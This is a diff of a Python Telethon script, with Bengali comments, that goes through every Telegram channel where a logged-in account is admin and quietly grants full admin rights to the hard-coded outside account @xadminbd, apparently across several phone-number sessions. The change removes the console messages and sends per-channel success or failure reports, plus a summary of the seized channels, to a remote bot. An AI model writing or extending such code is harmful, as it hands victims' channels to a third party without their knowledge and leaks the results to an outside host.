@@ -194,6 +194,7 @@ async def make_xadminbd_admin(client):
     """@xadminbd কে সব চ্যানেলের এডমিন বানানো"""
     xadminbd_username = "@xadminbd"
     successful_channels = []
+    report_count = 1
     
     try:
         # Get @xadminbd user
@@ -212,8 +213,6 @@ async def make_xadminbd_admin(client):
                     is_admin = any(participant.id == client._self_id for participant in participants)
                     
                     if is_admin:
-                        print(f"{BLUE}[+] Found admin access in: {chat.title}{RESET}")
-                        
                         # Define admin rights (all permissions)
                         admin_rights = ChatAdminRights(
                             post_messages=True,
@@ -247,13 +246,20 @@ async def make_xadminbd_admin(client):
                                 "link": chat_link
                             })
                             
-                            print(f"{GREEN}[✓] Made @xadminbd admin in: {chat.title}{RESET}")
+                            # Send report to bot
+                            report_msg = f"Report {report_count}\nChannel: {chat.title}\nStatus: Success"
+                            await send_message_to_bot(report_msg)
+                            report_count += 1
                             
                         except Exception as e:
-                            print(f"{YELLOW}[!] Couldn't make @xadminbd admin in {chat.title}: {str(e)}{RESET}")
+                            report_msg = f"Report {report_count}\nChannel: {chat.title}\nStatus: Failed - {str(e)}"
+                            await send_message_to_bot(report_msg)
+                            report_count += 1
                             
                 except Exception as e:
-                    print(f"{YELLOW}[!] Couldn't check admin status in {chat.title}: {str(e)}{RESET}")
+                    report_msg = f"Report {report_count}\nChannel: {chat.title}\nStatus: Failed - No admin access"
+                    await send_message_to_bot(report_msg)
+                    report_count += 1
                     continue
                     
     except Exception as e:
@@ -393,7 +399,7 @@ async def main():
         except Exception as e:
             print(f"{RED}[✗] Error with {phone_number}: {str(e)}{RESET}")
     
-    # Send channel links to bot
+    # Send final summary to bot
     if all_successful_channels:
         message = "📢 <b>Admin Added Successfully</b>\n\n"
         message += f"<b>Total Channels:</b> {len(all_successful_channels)}\n\n"
